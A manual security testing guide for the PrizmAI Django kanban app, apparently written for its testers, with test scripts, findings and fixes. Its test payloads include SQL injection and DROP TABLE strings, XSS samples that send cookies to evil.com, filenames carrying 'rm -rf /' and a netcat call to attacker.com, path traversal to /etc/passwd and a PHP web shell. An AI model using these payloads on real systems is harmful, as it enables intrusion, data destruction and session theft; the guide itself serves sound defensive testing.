# Manual Security Testing Guide for PrizmAI

**Purpose:** Step-by-step guide for manually testing PrizmAI's security controls  
**Audience:** Security testers, QA engineers, DevSecOps team  
**Last Updated:** November 14, 2025

---

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Authentication Security Testing](#authentication-security-testing)
3. [Authorization & Access Control Testing](#authorization--access-control-testing)
4. [Input Validation & Injection Testing](#input-validation--injection-testing)
5. [Session Management Testing](#session-management-testing)
6. [File Upload Security Testing](#file-upload-security-testing)
7. [API Security Testing](#api-security-testing)
8. [WebSocket Security Testing](#websocket-security-testing)
9. [Business Logic Testing](#business-logic-testing)
10. [Infrastructure Security Testing](#infrastructure-security-testing)
11. [Test Results Documentation](#test-results-documentation)

---

## Prerequisites

### Testing Environment Setup

1. **Deploy a Test Instance**
   ```bash
   # Clone the repository
   git clone https://github.com/paulavishek/PrizmAI.git
   cd PrizmAI
   
   # Create test environment
   python -m venv venv_test
   venv_test\Scripts\activate  # Windows
   
   # Install dependencies
   pip install -r requirements.txt
   
   # Create test .env file
   copy .env.example .env
   # Edit .env with test credentials
   
   # Run migrations
   python manage.py migrate
   
   # Create test superuser
   python manage.py createsuperuser
   
   # Start server
   python manage.py runserver
   ```

2. **Testing Tools Required**
   - Web browser (Chrome/Firefox with DevTools)
   - Burp Suite Community Edition (for intercepting requests)
   - cURL or Postman (for API testing)
   - Python with requests library
   - SQLite Browser (for database inspection)
   - Text editor (VS Code)

3. **Test Accounts Setup**
   - Create 3 test users: `testuser1`, `testuser2`, `testuser3`
   - Create 2 test organizations: `TestOrg1`, `TestOrg2`
   - Assign users to different organizations
   - Create test boards, tasks, and chat rooms

### Safety Warning

⚠️ **IMPORTANT:** 
- Only test on your OWN test environment
- Never test on production systems
- Never use real user data
- Document all findings responsibly
- Do not exploit vulnerabilities maliciously

---

## Authentication Security Testing

### Test 1: Brute Force Protection

**Objective:** Verify the application prevents brute force attacks on login

**Steps:**

1. Navigate to login page: `http://localhost:8000/accounts/login/`

2. **Automated Brute Force Test:**
   ```python
   import requests
   
   url = "http://localhost:8000/accounts/login/"
   
   # Get CSRF token first
   session = requests.Session()
   response = session.get(url)
   csrf_token = session.cookies.get('csrftoken')
   
   # Attempt multiple failed logins
   for i in range(20):
       data = {
           'username': 'testuser1',
           'password': f'wrongpassword{i}',
           'csrfmiddlewaretoken': csrf_token
       }
       response = session.post(url, data=data)
       print(f"Attempt {i+1}: Status {response.status_code}")
   ```

3. **Manual Test:**
   - Attempt to login 10 times with wrong password
   - Check if account gets locked
   - Check if CAPTCHA appears
   - Check response time (should not reveal if user exists)

**Expected Result:**
- ⚠️ **CURRENT STATUS:** No rate limiting on login attempts (VULNERABILITY)
- **SHOULD HAVE:** Account lockout after 5-10 failed attempts
- **SHOULD HAVE:** Delay or CAPTCHA after multiple failures

**Recommendation:** Install `django-axes` or implement custom rate limiting

---

### Test 2: Password Strength

**Objective:** Verify strong password requirements are enforced

**Steps:**

1. Navigate to registration: `http://localhost:8000/accounts/register/`

2. Try registering with weak passwords:
   - `123456`
   - `password`
   - `testuser` (same as username)
   - `qwerty`
   - `Test1234` (common pattern)

3. Check error messages displayed

**Test Commands:**
```python
from django.contrib.auth.password_validation import validate_password
from django.core.exceptions import ValidationError

weak_passwords = ['123456', 'password', 'qwerty', 'abc123']

for pwd in weak_passwords:
    try:
        validate_password(pwd)
        print(f"✗ {pwd} - ACCEPTED (BAD)")
    except ValidationError as e:
        print(f"✓ {pwd} - REJECTED (GOOD): {e}")
```

**Expected Result:**
- ✅ Django's default validators are active
- ✅ Minimum 8 characters required
- ✅ Not too similar to username
- ✅ Not entirely numeric
- ✅ Not a common password

**Status:** PASS ✅

---

### Test 3: Session Hijacking Prevention

**Objective:** Verify session cookies are secure

**Steps:**

1. Login to the application

2. **Inspect Session Cookie:**
   - Open DevTools → Application → Cookies
   - Check `sessionid` cookie attributes:
     - `HttpOnly`: Should be `true`
     - `Secure`: Should be `true` (production)
     - `SameSite`: Should be `Lax` or `Strict`

3. **Test Session Fixation:**
   ```python
   import requests
   
   # Get session before login
   s = requests.Session()
   r = s.get('http://localhost:8000/accounts/login/')
   pre_login_session = s.cookies.get('sessionid')
   
   # Login
   csrf = s.cookies.get('csrftoken')
   s.post('http://localhost:8000/accounts/login/', data={
       'username': 'testuser1',
       'password': 'correct_password',
       'csrfmiddlewaretoken': csrf
   })
   
   post_login_session = s.cookies.get('sessionid')
   
   # Session should change after login
   if pre_login_session != post_login_session:
       print("✓ Session rotated on login (GOOD)")
   else:
       print("✗ Session NOT rotated (VULNERABLE)")
   ```

4. **Test Session Timeout:**
   - Login and wait 30 minutes
   - Try to access protected page
   - Should redirect to login

**Expected Result:**
- ✅ HttpOnly flag set
- ✅ Secure flag set in production
- ✅ Session rotates on login
- ⚠️ Session timeout: Verify `SESSION_COOKIE_AGE` is set

**Status:** MOSTLY PASS ⚠️ (Verify production settings)

---

### Test 4: Password Reset Security

**Objective:** Verify password reset flow is secure

**Steps:**

1. Navigate to password reset (if implemented)

2. **Test Account Enumeration:**
   - Enter existing email → Check response
   - Enter non-existing email → Check response
   - Response should be identical (don't reveal if email exists)

3. **Test Reset Token:**
   - Request password reset
   - Check email for reset link
   - Extract token from URL
   - Verify token is:
     - Long and random (40+ characters)
     - Single-use only
     - Expires (typically 24 hours)

4. **Test Token Reuse:**
   ```bash
   # Use the same reset link twice
   curl -X POST http://localhost:8000/accounts/password-reset/confirm/ \
     -d "token=<token>&password=newpass123"
   
   # Try again with same token
   curl -X POST http://localhost:8000/accounts/password-reset/confirm/ \
     -d "token=<token>&password=anotherpass"
   ```

**Expected Result:**
- Response should not reveal if email exists
- Token should be cryptographically secure
- Token should expire after 24 hours
- Token should be single-use only

**Status:** Depends on implementation (Django Allauth handles this)

---

## Authorization & Access Control Testing

### Test 5: Horizontal Privilege Escalation

**Objective:** Verify users cannot access other users' data within same organization

**Steps:**

1. Login as `testuser1`
2. Create a task and note its ID (e.g., task ID 42)
3. Logout

4. Login as `testuser2` (same organization)
5. Try to access testuser1's task:
   ```
   http://localhost:8000/kanban/task/42/
   ```

6. Try to modify testuser1's task:
   ```python
   import requests
   
   s = requests.Session()
   # Login as testuser2
   s.post('http://localhost:8000/accounts/login/', data={
       'username': 'testuser2',
       'password': 'password',
       'csrfmiddlewaretoken': s.cookies.get('csrftoken')
   })
   
   # Try to edit testuser1's task
   csrf = s.cookies.get('csrftoken')
   response = s.post('http://localhost:8000/kanban/task/42/edit/', data={
       'title': 'HACKED',
       'csrfmiddlewaretoken': csrf
   })
   
   print(f"Status: {response.status_code}")
   print("✓ PASS" if response.status_code == 403 else "✗ FAIL (VULNERABLE)")
   ```

**Expected Result:**
- If task is on shared board: ALLOW ✅
- If task is on private board: DENY ❌
- Should return 403 Forbidden or redirect

**Status:** Verify board membership checks are working

---

### Test 6: Vertical Privilege Escalation

**Objective:** Verify regular users cannot access admin functions

**Steps:**

1. Login as regular user (`testuser1`)

2. **Test Admin Panel Access:**
   ```
   http://localhost:8000/admin/
   ```
   Should redirect to login or show 403

3. **Test Admin API Endpoints:**
   - Try to create organization without admin permission
   - Try to delete users
   - Try to access audit logs (if admin-only)

4. **Test Role Escalation:**
   ```python
   import requests
   
   s = requests.Session()
   # Login as regular user
   s.post('http://localhost:8000/accounts/login/', data={
       'username': 'testuser1',
       'password': 'password',
       'csrfmiddlewaretoken': s.cookies.get('csrftoken')
   })
   
   # Try to make self admin by modifying request
   csrf = s.cookies.get('csrftoken')
   response = s.post('http://localhost:8000/accounts/profile/', data={
       'is_admin': 'true',  # Try to inject admin role
       'csrfmiddlewaretoken': csrf
   })
   
   # Check if user became admin
   response = s.get('http://localhost:8000/accounts/profile/')
   if 'is_admin' in response.text and 'True' in response.text:
       print("✗ VULNERABLE - User escalated privileges!")
   else:
       print("✓ PASS - Privilege escalation prevented")
   ```

**Expected Result:**
- ✅ Admin panel inaccessible to regular users
- ✅ Admin-only views check `is_admin` flag
- ✅ Role cannot be modified via form manipulation

**Status:** Verify with code review of `@login_required` and `is_admin` checks

---

### Test 7: Cross-Organization Access

**Objective:** Verify users cannot access data from other organizations

**Steps:**

1. Login as `testuser1` (Organization 1)
2. Create a board and note its ID

3. Login as `testuser2` (Organization 2)
4. Try to access Organization 1's board:
   ```
   http://localhost:8000/kanban/board/<org1_board_id>/
   ```

5. Try API access:
   ```python
   import requests
   
   # Get API token for testuser2
   # Try to access testuser1's organization data
   headers = {'Authorization': 'Bearer <testuser2_token>'}
   response = requests.get(
       'http://localhost:8000/api/v1/boards/<org1_board_id>/',
       headers=headers
   )
   
   print(f"Status: {response.status_code}")
   print("✓ PASS" if response.status_code in [403, 404] else "✗ FAIL")
   ```

**Expected Result:**
- ✅ Should return 403 Forbidden or 404 Not Found
- ✅ Should not reveal existence of other org's data
- ✅ Organization filtering should be applied at queryset level

**Status:** CRITICAL - Must verify organization isolation

---

## Input Validation & Injection Testing

### Test 8: SQL Injection Testing

**Objective:** Verify application is not vulnerable to SQL injection

**Steps:**

1. **Test Search Functionality:**
   ```
   Search: ' OR '1'='1
   Search: '; DROP TABLE tasks; --
   Search: ' UNION SELECT username, password FROM auth_user--
   ```

2. **Test Filters:**
   ```
   http://localhost:8000/kanban/tasks/?priority=' OR '1'='1
   http://localhost:8000/kanban/tasks/?assigned_to=1; DROP TABLE users;--
   ```

3. **Test POST Parameters:**
   ```python
   import requests
   
   s = requests.Session()
   # Login first
   
   # Try SQL injection in task creation
   csrf = s.cookies.get('csrftoken')
   data = {
       'title': "'; DROP TABLE kanban_task; --",
       'description': "1' OR '1'='1",
       'priority': "' UNION SELECT * FROM auth_user WHERE ''='",
       'csrfmiddlewaretoken': csrf
   }
   
   response = s.post('http://localhost:8000/kanban/task/create/', data=data)
   print(f"Response: {response.status_code}")
   
   # Check if database still works
   response = s.get('http://localhost:8000/kanban/dashboard/')
   if response.status_code == 200:
       print("✓ PASS - SQL injection prevented")
   else:
       print("✗ FAIL - Possible SQL injection")
   ```

4. **Check `.extra()` Queries (Code Review):**
   - Review `kanban/views.py` lines 106, 122, 138, 153
   - Verify no user input goes into SQL strings
   - ⚠️ Current status: Hardcoded values (safe), but dangerous pattern

**Expected Result:**
- ✅ Django ORM prevents SQL injection by default
- ⚠️ Custom `.extra()` queries need review
- ✅ All user input should be parameterized

**Status:** MOSTLY SAFE ✅ (but `.extra()` needs refactoring)

---

### Test 9: Cross-Site Scripting (XSS) Testing

**Objective:** Verify application sanitizes user input to prevent XSS

**Test Payloads:**
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
<iframe src="javascript:alert('XSS')">
"><script>alert(String.fromCharCode(88,83,83))</script>
```

**Steps:**

1. **Test in Task Title:**
   - Create task with title: `<script>alert('XSS')</script>`
   - View task on board
   - Check if script executes (it shouldn't)

2. **Test in Task Description:**
   - Create task with description containing XSS payload
   - View task details
   - Check browser console for errors

3. **Test in Comments:**
   - Add comment with XSS payload
   - Check if rendered as text or executed

4. **Test in Wiki Pages (CRITICAL):**
   ```markdown
   # Test Page
   
   [Click me](javascript:alert('XSS'))
   
   <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
   
   <script>
   document.location='http://evil.com/steal?cookie='+document.cookie
   </script>
   ```

5. **Test in Chat Messages:**
   - Send chat message with XSS payload
   - Check if rendered safely

**Testing Script:**
```python
import requests
from bs4 import BeautifulSoup

payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>"
]

s = requests.Session()
# Login
s.post('http://localhost:8000/accounts/login/', data={
    'username': 'testuser1',
    'password': 'password',
    'csrfmiddlewaretoken': s.cookies.get('csrftoken')
})

for payload in payloads:
    # Create task with XSS payload
    csrf = s.cookies.get('csrftoken')
    response = s.post('http://localhost:8000/kanban/task/create/', data={
        'title': payload,
        'column_id': 1,
        'csrfmiddlewaretoken': csrf
    })
    
    # Check if payload is escaped in response
    if payload in response.text and '<script>' in response.text:
        print(f"✗ VULNERABLE to: {payload}")
    else:
        print(f"✓ Protected from: {payload}")
```

**Expected Result:**
- ✅ Django templates auto-escape by default
- 🔴 **VULNERABILITY FOUND:** Wiki markdown uses `mark_safe()` without sanitization
- ✅ Chat messages should be escaped

**Status:** VULNERABLE in Wiki pages - IMMEDIATE FIX REQUIRED 🔴

**Fix Required:**
```python
# In wiki/models.py
import bleach

def get_html_content(self):
    """Convert markdown to HTML and sanitize"""
    html = markdown.markdown(self.content)
    # Sanitize with bleach
    clean_html = bleach.clean(
        html,
        tags=['p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'ul', 'ol', 'li', 'a', 'code', 'pre'],
        attributes={'a': ['href', 'title']},
        protocols=['http', 'https', 'mailto']
    )
    return mark_safe(clean_html)
```

---

### Test 10: Command Injection Testing

**Objective:** Verify no command injection vulnerabilities

**Steps:**

1. **Test File Upload Filenames:**
   ```
   Filename: file.txt; rm -rf /
   Filename: file.txt | nc attacker.com 1234
   Filename: $(whoami).txt
   Filename: `id`.txt
   ```

2. **Test Export Functionality:**
   - If CSV export exists, test with injection in data:
   ```
   =cmd|'/c calc'!A1
   @SUM(1+1)*cmd|'/c calc'!A1
   ```

3. **Check Code for system() calls:**
   ```bash
   # Search codebase
   grep -r "os.system\|subprocess.call\|subprocess.run" .
   grep -r "eval\|exec" .
   ```

**Expected Result:**
- ✅ No `os.system()` or `subprocess` calls with user input
- 🔴 **FOUND:** `eval()` in `kanban/forms/__init__.py` line 331
- ✅ File operations use Django's file handling

**Status:** CRITICAL VULNERABILITY - eval() must be removed 🔴

---

### Test 11: Path Traversal Testing

**Objective:** Verify file operations don't allow directory traversal

**Steps:**

1. **Test File Upload:**
   ```python
   import requests
   
   s = requests.Session()
   # Login
   
   # Try to upload file with path traversal in name
   files = {
       'file': ('../../etc/passwd.txt', 'malicious content', 'text/plain')
   }
   csrf = s.cookies.get('csrftoken')
   data = {'csrfmiddlewaretoken': csrf}
   
   response = s.post(
       'http://localhost:8000/kanban/task/1/upload/',
       files=files,
       data=data
   )
   
   print(f"Status: {response.status_code}")
   ```

2. **Test File Download:**
   ```
   http://localhost:8000/media/tasks/../../etc/passwd
   http://localhost:8000/media/tasks/%2e%2e%2f%2e%2e%2fetc%2fpasswd
   ```

3. **Check File Storage:**
   - Check where files are actually stored
   - Verify they're in `media/tasks/` only
   - Check file permissions

**Expected Result:**
- ✅ Django's `FileField` with `upload_to` prevents path traversal
- ✅ Filenames should be sanitized
- ✅ Files should not escape media directory

**Status:** PASS ✅ (Django handles this securely)

---

## Session Management Testing

### Test 12: Session Fixation

**Objective:** Verify session ID changes after login

**Steps:**

See Test 3 above for detailed steps.

**Expected Result:**
- ✅ Session ID changes after login
- ✅ Session ID changes after password change
- ✅ Old session invalidated after logout

---

### Test 13: Concurrent Session Handling

**Objective:** Verify handling of multiple active sessions

**Steps:**

1. Login on Browser 1
2. Login with same user on Browser 2
3. Verify both sessions work OR one is invalidated

4. **Test Session Invalidation:**
   - Login on Browser 1
   - Change password on Browser 2
   - Browser 1 should be logged out

**Expected Result:**
- ⚠️ Verify `SESSION_EXPIRE_AT_BROWSER_CLOSE` setting
- ⚠️ Consider limiting concurrent sessions

---

## File Upload Security Testing

### Test 14: Malicious File Upload

**Objective:** Verify file upload validates file types properly

**Malicious File Tests:**

1. **Web Shell Upload:**
   ```php
   <?php system($_GET['cmd']); ?>
   ```
   Save as `shell.php.txt` or `shell.txt.php`

2. **HTML with JavaScript:**
   ```html
   <html><body>
   <script>alert('XSS from uploaded file')</script>
   </body></html>
   ```
   Save as `test.html`

3. **SVG with embedded JS:**
   ```xml
   <svg xmlns="http://www.w3.org/2000/svg">
   <script>alert('XSS')</script>
   </svg>
   ```
   Save as `test.svg`

4. **Double Extension:**
   - `malicious.php.txt`
   - `file.pdf.exe`

5. **Null Byte Injection:**
   - `file.txt%00.php`
   - `file.txt\x00.exe`

**Testing Steps:**

```python
import requests

s = requests.Session()
# Login

malicious_files = [
    ('shell.php', b'<?php system($_GET["cmd"]); ?>', 'application/x-php'),
    ('test.html', b'<script>alert("XSS")</script>', 'text/html'),
    ('test.svg', b'<svg><script>alert("XSS")</script></svg>', 'image/svg+xml'),
    ('file.exe', b'MZ\x90\x00', 'application/x-msdownload'),
]

for filename, content, mime_type in malicious_files:
    files = {'file': (filename, content, mime_type)}
    csrf = s.cookies.get('csrftoken')
    data = {'csrfmiddlewaretoken': csrf}
    
    response = s.post(
        'http://localhost:8000/kanban/task/1/upload/',
        files=files,
        data=data
    )
    
    if response.status_code == 200:
        print(f"✗ ACCEPTED: {filename} - POTENTIAL VULNERABILITY")
    else:
        print(f"✓ REJECTED: {filename}")
```

**Expected Result:**
- ✅ Only allowed file types accepted
- ✅ MIME type validation (not just extension)
- ✅ Content inspection (magic bytes check)
- ⚠️ **CURRENT STATUS:** Incomplete validation

**Recommendations:**
```python
# Add to TaskFileForm
from django.core.exceptions import ValidationError
import magic  # python-magic library

def clean_file(self):
    file = self.cleaned_data.get('file')
    
    # Check file size
    if file.size > TaskFile.MAX_FILE_SIZE:
        raise ValidationError(f'File too large. Max size: 10MB')
    
    # Check extension
    ext = file.name.split('.')[-1].lower()
    if ext not in TaskFile.ALLOWED_FILE_TYPES:
        raise ValidationError(f'File type not allowed: {ext}')
    
    # Verify MIME type
    mime = magic.from_buffer(file.read(1024), mime=True)
    file.seek(0)
    
    allowed_mimes = [
        'application/pdf',
        'application/msword',
        'image/jpeg',
        'image/png',
        # Add more...
    ]
    
    if mime not in allowed_mimes:
        raise ValidationError(f'Invalid file type: {mime}')
    
    return file
```

---

### Test 15: File Size Limits

**Objective:** Verify file size limits are enforced

**Steps:**

1. **Test Maximum File Size:**
   ```python
   import requests
   
   # Create 15MB file (over 10MB limit)
   large_content = b'A' * (15 * 1024 * 1024)
   
   s = requests.Session()
   # Login
   
   files = {'file': ('large_file.txt', large_content, 'text/plain')}
   csrf = s.cookies.get('csrftoken')
   data = {'csrfmiddlewaretoken': csrf}
   
   response = s.post(
       'http://localhost:8000/kanban/task/1/upload/',
       files=files,
       data=data
   )
   
   if 'too large' in response.text.lower() or response.status_code == 400:
       print("✓ PASS - File size limit enforced")
   else:
       print("✗ FAIL - Large file accepted")
   ```

2. **Test Resource Exhaustion:**
   - Upload 100 files quickly
   - Check server response time
   - Check disk space usage

**Expected Result:**
- ✅ 10MB limit enforced
- ✅ Total upload quota per user/org (optional)
- ✅ Rate limiting on uploads

**Status:** Verify form validation includes size check

---

## API Security Testing

### Test 16: API Authentication Bypass

**Objective:** Verify API endpoints require authentication

**Steps:**

1. **Test Unauthenticated Access:**
   ```python
   import requests
   
   endpoints = [
       '/api/v1/boards/',
       '/api/v1/tasks/',
       '/api/v1/comments/',
   ]
   
   for endpoint in endpoints:
       response = requests.get(f'http://localhost:8000{endpoint}')
       if response.status_code == 200:
           print(f"✗ VULNERABLE: {endpoint} accessible without auth")
       elif response.status_code == 401:
           print(f"✓ PROTECTED: {endpoint} requires auth")
       else:
           print(f"? {endpoint}: Status {response.status_code}")
   ```

2. **Test Invalid Token:**
   ```python
   headers = {'Authorization': 'Bearer invalid_token_12345'}
   response = requests.get('http://localhost:8000/api/v1/boards/', headers=headers)
   
   if response.status_code == 401:
       print("✓ Invalid token rejected")
   else:
       print("✗ Invalid token accepted!")
   ```

**Expected Result:**
- ✅ 401 Unauthorized without token
- ✅ 401 for invalid/expired tokens
- ✅ Proper authentication required

---

### Test 17: API Rate Limiting

**Objective:** Verify rate limiting prevents abuse

**Steps:**

1. **Create API Token:**
   - Login to web interface
   - Navigate to API settings
   - Create token with rate limit: 1000 req/hour

2. **Test Rate Limit:**
   ```python
   import requests
   import time
   
   token = 'your_api_token_here'
   headers = {'Authorization': f'Bearer {token}'}
   url = 'http://localhost:8000/api/v1/boards/'
   
   success_count = 0
   rate_limited = False
   
   for i in range(1100):  # Try to exceed 1000 limit
       response = requests.get(url, headers=headers)
       
       if response.status_code == 200:
           success_count += 1
       elif response.status_code == 429:  # Too Many Requests
           print(f"✓ Rate limited after {success_count} requests")
           rate_limited = True
           break
       
       if i % 100 == 0:
           print(f"Completed {i} requests...")
   
   if not rate_limited:
       print("✗ VULNERABLE - No rate limiting detected!")
   ```

**Expected Result:**
- ✅ Rate limit enforced at 1000 req/hour
- ✅ 429 Too Many Requests returned
- ✅ Retry-After header included

**Status:** Verify `DEFAULT_THROTTLE_RATES` in settings.py

---

### Test 18: API Scope Enforcement

**Objective:** Verify API tokens respect scope restrictions

**Steps:**

1. **Create Limited Token:**
   - Create token with only `boards.read` scope

2. **Test Read Access:**
   ```python
   headers = {'Authorization': f'Bearer {read_only_token}'}
   response = requests.get('http://localhost:8000/api/v1/boards/', headers=headers)
   
   if response.status_code == 200:
       print("✓ Read access granted")
   else:
       print("✗ Read access denied (unexpected)")
   ```

3. **Test Write Access (Should Fail):**
   ```python
   headers = {'Authorization': f'Bearer {read_only_token}'}
   data = {'name': 'Test Board', 'description': 'Test'}
   response = requests.post('http://localhost:8000/api/v1/boards/', 
                           json=data, headers=headers)
   
   if response.status_code == 403:
       print("✓ Write access denied (correct)")
   else:
       print("✗ Write access granted with read-only token!")
   ```

**Expected Result:**
- ✅ Scope enforcement working
- ✅ 403 Forbidden for out-of-scope operations
- ✅ Clear error messages

---

## WebSocket Security Testing

### Test 19: WebSocket Authentication

**Objective:** Verify WebSocket connections require authentication

**Steps:**

1. **Test Unauthenticated Connection:**
   ```javascript
   // Open browser console on http://localhost:8000
   const ws = new WebSocket('ws://localhost:8000/ws/chat/room/1/');
   
   ws.onopen = () => console.log('Connected');
   ws.onerror = (e) => console.log('Connection failed:', e);
   ws.onclose = (e) => console.log('Connection closed:', e);
   ```

2. **Test with Valid Session:**
   - Login to web interface
   - Open chat room
   - Check WebSocket connection in DevTools → Network → WS

3. **Test Connection Hijacking:**
   ```python
   import websocket
   
   # Try to connect without proper authentication
   ws = websocket.create_connection('ws://localhost:8000/ws/chat/room/1/')
   ws.send('{"type": "chat_message", "message": "HACKED"}')
   result = ws.recv()
   print(result)
   ```

**Expected Result:**
- ✅ Unauthenticated connections rejected
- ✅ Authorization checked in `connect()` method
- ✅ Message sending requires authenticated user

**Status:** Review `messaging/consumers.py` authentication

---

### Test 20: WebSocket Message Validation

**Objective:** Verify WebSocket messages are validated

**Steps:**

1. **Test Malformed JSON:**
   ```javascript
   // In authenticated WebSocket connection
   ws.send('not json');
   ws.send('{invalid json}');
   ws.send('{"type": "unknown_type"}');
   ```

2. **Test XSS in Messages:**
   ```javascript
   ws.send(JSON.stringify({
       type: 'chat_message',
       message: '<script>alert("XSS")</script>'
   }));
   ```

3. **Test Message Flooding:**
   ```javascript
   // Send 1000 messages rapidly
   for (let i = 0; i < 1000; i++) {
       ws.send(JSON.stringify({
           type: 'chat_message',
           message: `Flood test ${i}`
       }));
   }
   ```

**Expected Result:**
- ✅ Malformed JSON handled gracefully
- ✅ XSS payloads escaped
- ⚠️ Rate limiting on WebSocket messages (to be implemented)

---

## Business Logic Testing

### Test 21: Organization Isolation

**Objective:** Verify complete isolation between organizations

**Steps:**

1. Create 2 organizations with boards, tasks, users
2. Attempt cross-organization access via:
   - Direct URL manipulation
   - API calls
   - WebSocket connections
   - File downloads

**Expected Result:**
- ✅ Complete isolation enforced
- ✅ 403/404 errors for cross-org access

---

### Test 22: Role-Based Access Control

**Objective:** Verify admin vs. regular member permissions

**Test Matrix:**

| Action | Admin | Member | Expected |
|--------|-------|--------|----------|
| Create board | ✅ | ✅ | Both can |
| Delete board (own) | ✅ | ✅ | Both can |
| Delete board (other's) | ✅ | ❌ | Admin only |
| Add organization members | ✅ | ❌ | Admin only |
| Remove members | ✅ | ❌ | Admin only |
| Change organization settings | ✅ | ❌ | Admin only |
| View audit logs | ✅ | ❌ | Admin only |

**Testing Script:**
```python
# Test each permission with both roles
# Document any discrepancies
```

---

## Infrastructure Security Testing

### Test 23: Security Headers

**Objective:** Verify proper security headers are set

**Steps:**

1. **Check Headers:**
   ```bash
   curl -I http://localhost:8000/
   ```

2. **Expected Headers:**
   ```
   Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
   X-Content-Type-Options: nosniff
   X-Frame-Options: DENY
   X-XSS-Protection: 1; mode=block
   Content-Security-Policy: default-src 'self'
   Referrer-Policy: strict-origin-when-cross-origin
   ```

3. **Check Missing Headers:**
   - ⚠️ Content-Security-Policy (CSP) - NOT CONFIGURED
   - ⚠️ Permissions-Policy
   - ⚠️ Cross-Origin-Embedder-Policy

**Status:** PARTIAL - CSP needs to be added

---

### Test 24: SSL/TLS Configuration

**Objective:** Verify strong TLS configuration (Production only)

**Steps:**

1. **Test with SSL Labs:**
   ```
   https://www.ssllabs.com/ssltest/analyze.html?d=yourdomain.com
   ```

2. **Check Certificate:**
   - Valid certificate
   - Not expired
   - Proper chain
   - Strong cipher suites

3. **Test TLS Version:**
   ```bash
   openssl s_client -connect yourdomain.com:443 -tls1
   openssl s_client -connect yourdomain.com:443 -tls1_1
   ```
   TLS 1.0 and 1.1 should be disabled

**Expected Result:**
- ✅ A+ rating on SSL Labs
- ✅ TLS 1.2+ only
- ✅ Strong cipher suites

---

### Test 25: Dependency Vulnerabilities

**Objective:** Check for known vulnerabilities in dependencies

**Steps:**

1. **Run Safety Check:**
   ```bash
   pip install safety
   safety check
   ```

2. **Check Requirements:**
   ```bash
   pip list --outdated
   ```

3. **Review Output:**
   - Note any HIGH or CRITICAL vulnerabilities
   - Plan updates

**Expected Result:**
- ✅ No known vulnerabilities
- ⚠️ Regular updates scheduled

---

## Test Results Documentation

### Test Result Template

For each test, document:

```markdown
## Test [Number]: [Test Name]

**Date:** YYYY-MM-DD
**Tester:** [Name]
**Environment:** Development/Staging/Production

### Result
- [ ] PASS
- [ ] FAIL
- [ ] PARTIAL

### Details
[Description of findings]

### Evidence
[Screenshots, logs, code snippets]

### Risk Rating
- [ ] Critical
- [ ] High
- [ ] Medium
- [ ] Low
- [ ] Informational

### Recommendations
[Actions to take]

### Status
- [ ] Open
- [ ] In Progress
- [ ] Fixed
- [ ] Accepted Risk
```

---

## Summary Checklist

After completing all tests, use this checklist:

### Authentication & Session Management
- [ ] Brute force protection tested
- [ ] Password strength enforced
- [ ] Session hijacking prevented
- [ ] Password reset secure
- [ ] Session timeout configured

### Authorization
- [ ] Horizontal privilege escalation prevented
- [ ] Vertical privilege escalation prevented
- [ ] Cross-organization access blocked
- [ ] Role-based access working

### Input Validation
- [ ] SQL injection prevented
- [ ] XSS vulnerabilities fixed
- [ ] Command injection prevented
- [ ] Path traversal blocked

### File Upload Security
- [ ] File type validation working
- [ ] Size limits enforced
- [ ] Malicious files blocked
- [ ] File storage secure

### API Security
- [ ] Authentication required
- [ ] Rate limiting working
- [ ] Scope enforcement verified
- [ ] Token management secure

### WebSocket Security
- [ ] Authentication required
- [ ] Message validation working
- [ ] Rate limiting implemented
- [ ] XSS in messages prevented

### Infrastructure
- [ ] Security headers configured
- [ ] SSL/TLS properly configured
- [ ] No dependency vulnerabilities
- [ ] Secrets properly managed

---

## Critical Vulnerabilities Found

### 🔴 CRITICAL - IMMEDIATE FIX REQUIRED

1. **eval() usage in forms**
   - Location: `kanban/forms/__init__.py` line 331
   - Risk: Remote Code Execution
   - Action: Remove eval(), use JSON parsing only

2. **mark_safe() without sanitization**
   - Location: `wiki/models.py` lines 82, 233
   - Risk: Stored XSS
   - Action: Install bleach, sanitize markdown output

3. **Incomplete file upload validation**
   - Location: `kanban/views.py`, `messaging/views.py`
   - Risk: Malicious file upload
   - Action: Add MIME type validation, magic bytes check

---

## Next Steps

1. Fix all CRITICAL vulnerabilities immediately
2. Address HIGH-risk issues within 1 week
3. Plan remediation for MEDIUM-risk issues
4. Schedule regular security testing (quarterly)
5. Implement automated security scanning in CI/CD
6. Train development team on secure coding

---

## Resources

- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
- **Django Security:** https://docs.djangoproject.com/en/stable/topics/security/
- **Burp Suite:** https://portswigger.net/burp/communitydownload
- **OWASP ZAP:** https://www.zaproxy.org/

---

**Document Version:** 1.0  
**Last Updated:** November 14, 2025  
**Next Review:** February 14, 2026
